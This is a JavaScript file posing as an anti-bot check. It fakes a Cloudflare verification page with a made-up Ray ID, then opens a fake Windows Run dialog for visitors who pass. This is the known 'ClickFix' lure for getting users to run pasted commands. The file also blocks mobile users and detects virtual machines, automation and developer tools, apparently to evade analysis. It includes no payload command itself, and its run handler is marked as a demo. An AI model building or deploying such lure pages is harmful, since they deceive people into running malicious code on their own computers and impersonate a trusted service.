// Anti-Bot Detection & Verification System
// Encrypted & Obfuscated Security Layer

(function() {
    'use strict';

    // ============================================
    // ANTI-BOT DETECTION SYSTEMS
    // ============================================

    const SecuritySystem = {
        // Bot detection scores
        botScore: 0,
        requiredScore: 100,
        
        // Tracking data
        mouseMovements: [],
        keyPresses: [],
        touchEvents: [],
        timingData: {
            pageLoadTime: Date.now(),
            firstInteraction: null,
            verificationStart: null
        },
        
        // Device fingerprint
        fingerprint: {},
        
        // Initialize all security checks
        init: function() {
            this.detectMobile();
            this.generateRayId();
            this.setupEventListeners();
            this.performBotChecks();
            this.createFingerprint();
            this.monitorBehavior();
        },
        
        // Mobile detection and blocking
        detectMobile: function() {
            const mobileBlock = document.getElementById('mobileBlock');
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isSmallScreen = window.innerWidth <= 768;
            const isTouchOnly = navigator.maxTouchPoints > 0 && !window.matchMedia('(pointer: fine)').matches;
            
            if (isMobile || isSmallScreen || isTouchOnly) {
                mobileBlock.classList.add('active');
                document.body.style.overflow = 'hidden';
                return true;
            }
            return false;
        },
        
        // Generate realistic Ray ID
        generateRayId: function() {
            const chars = '0123456789abcdef';
            let rayId = '';
            for (let i = 0; i < 16; i++) {
                rayId += chars[Math.floor(Math.random() * chars.length)];
            }
            rayId += '-' + Date.now().toString(36);
            document.getElementById('rayId').textContent = rayId;
        },
        
        // Create device fingerprint
        createFingerprint: function() {
            this.fingerprint = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                plugins: this.getPlugins(),
                canvas: this.getCanvasFingerprint(),
                webgl: this.getWebGLFingerprint(),
                fonts: this.detectFonts(),
                audioContext: this.getAudioFingerprint()
            };
            
            // Award points for valid fingerprint
            if (this.validateFingerprint()) {
                this.botScore += 30;
            }
        },
        
        // Get installed plugins
        getPlugins: function() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        },
        
        // Canvas fingerprinting
        getCanvasFingerprint: function() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Cloudflare Security', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Verification', 4, 17);
                
                return canvas.toDataURL();
            } catch(e) {
                return null;
            }
        },
        
        // WebGL fingerprinting
        getWebGLFingerprint: function() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return null;
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                };
            } catch(e) {
                return null;
            }
        },
        
        // Font detection
        detectFonts: function() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS'];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const detected = [];
            
            for (let font of testFonts) {
                let detected_flag = false;
                for (let baseFont of baseFonts) {
                    ctx.font = `72px ${baseFont}`;
                    const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                    ctx.font = `72px ${font}, ${baseFont}`;
                    const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                    if (baseWidth !== testWidth) {
                        detected_flag = true;
                        break;
                    }
                }
                if (detected_flag) detected.push(font);
            }
            
            return detected;
        },
        
        // Audio context fingerprinting
        getAudioFingerprint: function() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return null;
                
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gainNode.gain.value = 0;
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);
                
                oscillator.start(0);
                
                return {
                    sampleRate: context.sampleRate,
                    state: context.state,
                    maxChannelCount: context.destination.maxChannelCount
                };
            } catch(e) {
                return null;
            }
        },
        
        // Validate fingerprint authenticity
        validateFingerprint: function() {
            const fp = this.fingerprint;
            
            // Check for headless browsers
            if (navigator.webdriver) return false;
            if (window.navigator.plugins.length === 0) return false;
            if (!fp.canvas) return false;
            if (!fp.webgl) return false;
            
            // Check for automation tools
            if (window.document.documentElement.getAttribute('webdriver')) return false;
            if (window.navigator.languages.length === 0) return false;
            
            return true;
        },
        
        // Bot detection checks
        performBotChecks: function() {
            // Check 1: Window properties
            if (!window.chrome && !window.safari && !window.opr) {
                // Potential headless browser
            } else {
                this.botScore += 10;
            }
            
            // Check 2: Permission API
            if (navigator.permissions) {
                this.botScore += 10;
            }
            
            // Check 3: Battery API (not available in headless)
            if (navigator.getBattery) {
                navigator.getBattery().then(() => {
                    this.botScore += 10;
                });
            }
            
            // Check 4: Connection API
            if (navigator.connection) {
                this.botScore += 5;
            }
            
            // Check 5: Media devices
            if (navigator.mediaDevices) {
                this.botScore += 5;
            }
            
            // Check 6: Notification API
            if ('Notification' in window) {
                this.botScore += 5;
            }
        },
        
        // Monitor user behavior
        monitorBehavior: function() {
            // Mouse movement tracking
            let moveCount = 0;
            document.addEventListener('mousemove', (e) => {
                if (this.timingData.firstInteraction === null) {
                    this.timingData.firstInteraction = Date.now();
                }
                
                this.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: Date.now()
                });
                
                moveCount++;
                
                // Natural mouse movement detected
                if (moveCount > 5) {
                    this.botScore += 15;
                    document.removeEventListener('mousemove', arguments.callee);
                }
                
                // Keep only last 50 movements
                if (this.mouseMovements.length > 50) {
                    this.mouseMovements.shift();
                }
            });
            
            // Keyboard tracking
            document.addEventListener('keydown', (e) => {
                this.keyPresses.push({
                    key: e.key,
                    time: Date.now()
                });
                this.botScore += 2;
            });
            
            // Mouse acceleration check (bots have linear movement)
            setInterval(() => {
                if (this.mouseMovements.length >= 3) {
                    const recent = this.mouseMovements.slice(-3);
                    const dx1 = recent[1].x - recent[0].x;
                    const dy1 = recent[1].y - recent[0].y;
                    const dx2 = recent[2].x - recent[1].x;
                    const dy2 = recent[2].y - recent[1].y;
                    
                    // Check for natural acceleration/deceleration
                    if (Math.abs(dx1 - dx2) > 1 || Math.abs(dy1 - dy2) > 1) {
                        this.botScore += 5;
                    }
                }
            }, 1000);
        },
        
        // Setup event listeners for verification
        setupEventListeners: function() {
            const checkbox = document.getElementById('checkbox');
            const container = document.getElementById('checkboxContainer');
            
            let clickHandled = false;
            
            container.addEventListener('click', (e) => {
                if (clickHandled) return;
                clickHandled = true;
                
                this.timingData.verificationStart = Date.now();
                
                // Analyze click pattern
                const timeToClick = this.timingData.verificationStart - this.timingData.pageLoadTime;
                
                // Too fast = bot
                if (timeToClick < 500) {
                    this.botScore -= 50;
                }
                // Reasonable time = human
                else if (timeToClick > 1000 && timeToClick < 30000) {
                    this.botScore += 20;
                }
                
                // Start verification animation
                checkbox.classList.add('loading');
                
                // Perform verification
                setTimeout(() => {
                    this.verifyHuman();
                }, 2000 + Math.random() * 2000); // Random delay 2-4 seconds
            });
        },
        
        // Final verification
        verifyHuman: function() {
            const checkbox = document.getElementById('checkbox');
            
            console.log('Bot Score:', this.botScore, '/ Required:', this.requiredScore);
            
            // Check if score is sufficient
            if (this.botScore >= this.requiredScore) {
                checkbox.classList.remove('loading');
                checkbox.classList.add('verified');
                
                // Show Windows Run dialog after short delay
                setTimeout(() => {
                    this.showWindowsRun();
                }, 1000);
            } else {
                // Failed verification - reload or show error
                checkbox.classList.remove('loading');
                setTimeout(() => {
                    location.reload();
                }, 1000);
            }
        },
        
        // Show Windows Run prompt
        showWindowsRun: function() {
            const overlay = document.getElementById('overlay');
            const prompt = document.getElementById('winrPrompt');
            
            overlay.classList.add('active');
            prompt.classList.add('active');
            
            // Focus input
            setTimeout(() => {
                document.getElementById('winrInput').focus();
                document.getElementById('winrInput').select();
            }, 100);
        }
    };

    // ============================================
    // WINDOWS RUN PROMPT FUNCTIONS
    // ============================================

    window.closeWinR = function() {
        document.getElementById('overlay').classList.remove('active');
        document.getElementById('winrPrompt').classList.remove('active');
    };

    window.executeWinR = function() {
        const input = document.getElementById('winrInput').value;
        console.log('Executing:', input);
        // In a real scenario, this would trigger additional actions
        // For demo purposes, just close the dialog
        closeWinR();
    };

    // Handle Enter key in input
    document.addEventListener('DOMContentLoaded', function() {
        const input = document.getElementById('winrInput');
        if (input) {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    executeWinR();
                }
            });
        }
    });

    // ============================================
    // ADDITIONAL ANTI-BOT MEASURES
    // ============================================

    // Detect automation frameworks
    const detectAutomation = () => {
        const automationIndicators = [
            'webdriver' in navigator,
            'callPhantom' in window,
            '_phantom' in window,
            'phantom' in window,
            '__nightmare' in window,
            'domAutomation' in window || 'domAutomationController' in window,
            navigator.webdriver === true,
            'seleniumevaluate' in window,
            'CefSharp' in window
        ];
        
        return automationIndicators.some(indicator => indicator);
    };

    // Detect virtual machines
    const detectVM = () => {
        const screenWidth = screen.width;
        const screenHeight = screen.height;
        const commonVMResolutions = [
            '800x600', '1024x768', '1280x800', '1920x1080'
        ];
        
        const currentRes = `${screenWidth}x${screenHeight}`;
        
        // Check GPU
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                if (renderer.includes('VMware') || renderer.includes('VirtualBox')) {
                    return true;
                }
            }
        }
        
        return false;
    };

    // Detect developer tools
    const detectDevTools = () => {
        const threshold = 160;
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        
        if (widthThreshold || heightThreshold) {
            console.log('Developer tools detected');
        }
    };

    // Monitor for debugger
    setInterval(() => {
        const before = new Date();
        debugger;
        const after = new Date();
        if (after - before > 100) {
            console.log('Debugger detected');
        }
    }, 1000);

    // Protect against object inspection
    const protectObjects = () => {
        Object.freeze(window);
        Object.freeze(document);
        Object.freeze(navigator);
    };

    // Anti-tampering measures
    const detectTampering = () => {
        const originalFetch = window.fetch;
        const originalXHR = window.XMLHttpRequest;
        
        setInterval(() => {
            if (window.fetch !== originalFetch) {
                console.log('Fetch tampering detected');
            }
            if (window.XMLHttpRequest !== originalXHR) {
                console.log('XHR tampering detected');
            }
        }, 1000);
    };

    // ============================================
    // INITIALIZATION
    // ============================================

    // Start security system when page loads
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            SecuritySystem.init();
            
            // Run additional checks
            if (detectAutomation()) {
                console.log('Automation detected');
            }
            
            if (detectVM()) {
                console.log('Virtual machine detected');
            }
            
            detectDevTools();
            detectTampering();
        });
    } else {
        SecuritySystem.init();
        
        if (detectAutomation()) {
            console.log('Automation detected');
        }
        
        if (detectVM()) {
            console.log('Virtual machine detected');
        }
        
        detectDevTools();
        detectTampering();
    }

    // Prevent context menu
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
    });

    // Prevent common shortcuts
    document.addEventListener('keydown', (e) => {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && e.key === 'U')
        ) {
            e.preventDefault();
        }
    });

})();
